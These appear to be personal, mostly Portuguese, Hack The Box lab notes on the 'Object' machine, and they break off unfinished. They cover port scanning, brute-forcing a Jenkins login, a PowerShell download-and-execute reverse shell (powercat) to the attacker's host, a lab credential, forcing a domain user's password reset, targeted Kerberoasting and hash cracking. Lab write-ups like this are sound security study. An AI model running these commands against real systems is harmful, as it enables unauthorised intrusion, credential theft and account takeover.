Object
========================

# Enumeration

    sudo nmap_enum 10.10.11.132 | tee nmap_output.txt

![qownnotes-media-uIiYWI](../../../media/qownnotes-media-uIiYWI.png)

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 10.10.11.132 | tee nmap_udp_output.txt
    
![qownnotes-media-kVWfvD](../../../media/qownnotes-media-kVWfvD.png)

    
    sudo nmap -p- -Pn -T5 -n 10.10.11.132 | tee nmap_fullportstcp_output.txt

![qownnotes-media-iBzsFp](../../../media/qownnotes-media-iBzsFp.png)

    sudo nmap -sS --script vuln -n -T5 -Pn 10.10.11.132 -p 80,8080,5985 | tee nmap_vulns.txt

![qownnotes-media-qhQEgL](../../../media/qownnotes-media-qhQEgL.png)


Servicos
[HTTP 8080](Object.md#HTTP8080)
[HTTP 80](Object.md#HTTP80)

Em meio ao que ja vi, so faltria fazermos duas coisas. Fazer uma listagem de credenciais via cewl ou enumeracao de subdominio.




## HTTP80

![qownnotes-media-WHzKpg](../../../media/qownnotes-media-WHzKpg.png)

    gobuster dir -u http://10.10.11.132 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_protocol_gobuster.txt"
    
    gobuster dir -u http://10.10.11.132 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_ext_gobuster.txt"

![qownnotes-media-XnZBGK](../../../media/qownnotes-media-XnZBGK.png)


    nikto -host http://10.10.11.132 -T x 6 | tee nikto_output.txt

![qownnotes-media-PFZbGf](../../../media/qownnotes-media-PFZbGf.png)

    nikto -host http://10.10.11.132:8080 -T x 6 | tee nikto_output.txt

## HTTP8080

![qownnotes-media-BwjBEA](../../../media/qownnotes-media-BwjBEA.png)

    gobuster dir -u http://10.10.11.132:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_8080_protocol_ext_gobuster.txt"
Nao rolou

    nikto -host http://10.10.11.132:8080 -T x 6 | tee nikto_output.txt
    
 ![qownnotes-media-GcuhwL](../../../media/qownnotes-media-GcuhwL.png)

    hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.132 http-post-form -s 8080 "/j_spring_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Location\: http\://10.10.11.132\:8080/loginError"


    ffuf -c -w /usr/share/wordlists/rockyou.txt -r -mc 403 -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "j_username=admin&j_password=FUZZ&from=%2F&Submit=Sign+in" -u http://10.10.11.132:8080/j_spring_security_check
    
    ffuf -c -w passwords_temp.txt -r -mc 403 -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "j_username=admin&j_password=FUZZ&from=%2F&Submit=Sign+in" -u http://10.10.11.132:8080/j_spring_security_check
    
![qownnotes-media-WePDgz](../../../media/qownnotes-media-WePDgz.png)


    powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/powercat.ps1');powercat -c 10.10.14.5 -p 8082 -e powershell"

    powershell -c "Test-netconnection -port 80 10.10.14.5"
    
Notei que as conexoes nao chegavam minha minha... Basicamente era o firewall bloqueando e a forma de enumerarmos isso eh a seguinte:

    powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block

Olhar para excecoes:
    
    powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow        

O mindset aqui foi de descobrir qual seria a senha utilizada para operar o serviço, o que, de uma certa forma seria o camminho correto. Teria de fazer uma pesquisa mais aprofundada para saber onde o jenkins armazena informacoes como senhas e usuarios, por exemplo:

oliver
c1cdfun_d2434

    evil-winrm -i 10.10.11.132 -u oliver -p c1cdfun_d2434

# Privilege Escalation

    upload PowerUp.ps1
    invoke-allchecks

![qownnotes-media-PgMauC](../../../media/qownnotes-media-PgMauC.png)


    whoami /all

![qownnotes-media-FZxBdR](../../../media/qownnotes-media-FZxBdR.png)


    tasklist /svc
    
    schtasks /query /fo LIST /v
    
    net start

![qownnotes-media-TexdwF](../../../media/qownnotes-media-TexdwF.png)


    Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime

![qownnotes-media-paGBNb](../../../media/qownnotes-media-paGBNb.png)


    mountvol

![qownnotes-media-QrVIwg](../../../media/qownnotes-media-QrVIwg.png)


    
    ipconfig /all
 
 ![qownnotes-media-ybnmBN](../../../media/qownnotes-media-ybnmBN.png)

    cmdkey /list

![qownnotes-media-ActaJz](../../../media/qownnotes-media-ActaJz.png)


    gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

![qownnotes-media-pWhyQH](../../../media/qownnotes-media-pWhyQH.png)


    netstat -naop tcp

![qownnotes-media-xuQZML](../../../media/qownnotes-media-xuQZML.png)

    #NA MAQUINA ATACANTE
    cp /home/acosta/owncloud/Area_de_trabalho/tools/windows/6-AD_Tools/SharpHound.exe /home/acosta/owncloud/Area_de_trabalho/estudos/hack_the_box/object/sh.exe
    
    #NO ALVO
    upload sh.exe
    ./sh.exe -c all --zipfilename object.zip

![qownnotes-media-xtLxMs](../../../media/qownnotes-media-xtLxMs.png)

    download 20231009115133_object.zip

Aqui descobrimos um caminiho interessante:

    Shortest Paths to Domain Admins from Owned Principals

![qownnotes-media-sOGLry](../../../media/qownnotes-media-sOGLry.png)

    $SecPassword = ConvertTo-SecureString 'c1cdfun_d2434' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('OBJECT.LOCAL\oliver', $SecPassword)
    $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    Set-DomainUserPassword -Identity smith -AccountPassword $UserPassword -Credential $Cred

![qownnotes-media-eTVVaw](../../../media/qownnotes-media-eTVVaw.png)

Shell as smith

    evil-winrm -i 10.10.11.132 -u smith -p 'Password123!'
    . ./powerview.ps1   
    $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('OBJECT.LOCAL\SMITH', $SecPassword)
    Set-DomainObject -Credential $Cred -Identity maria -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
    Get-DomainSPNTicket -Credential $Cred maria | fl
    # Nao funcionou
    
![qownnotes-media-PlVaaf](../../../media/qownnotes-media-PlVaaf.png)

    Set-DomainObject -Credential $Cred -Identity maria -SET @{serviceprincipalname='test.local/maria'}
    Get-DomainSPNTicket -Credential $Cred -SPN test.local/maria
    #  Dai deu errado, mas o teste mais prudente que fiz foi o seguinte:

![qownnotes-media-EJRePR](../../../media/qownnotes-media-EJRePR.png)

    Set-DomainObject -Credential $Cred -Identity maria -SET @{serviceprincipalname='test.local/test'}
    get-domainuser maria
![qownnotes-media-aYLmDu](../../../media/qownnotes-media-aYLmDu.png)

    Get-DomainSPNTicket -Credential $Cred -SPN test.local/test
    
![qownnotes-media-bfEMKT](../../../media/qownnotes-media-bfEMKT.png)

Nao deu certo, porque eu nao estava conseguindo ajustar o output da ferramenta,  e um outro teste que fiz foi o seguinte:

    Get-DomainSPNTicket -Credential $Cred -SPN test.local/test | select hash
    
![qownnotes-media-uIlrKJ](../../../media/qownnotes-media-uIlrKJ.png)

    
    Get-DomainSPNTicket -Credential $Cred -SPN test.local/test | select hash | Select-Object -ExpandProperty hash

Ate que aqui finalmente funcionou, porem eu nao consegui quebrar o hash de senha do usuario:


![qownnotes-media-oLUkRk](../../../media/qownnotes-media-oLUkRk.png)


    vi hash.txt
    john -w=/usr/share/wordlists/rockyou.txt hash.txt

![qownnotes-media-BfGanQ](../../../media/qownnotes-media-BfGanQ.png)

Continuo depois com essa maquina...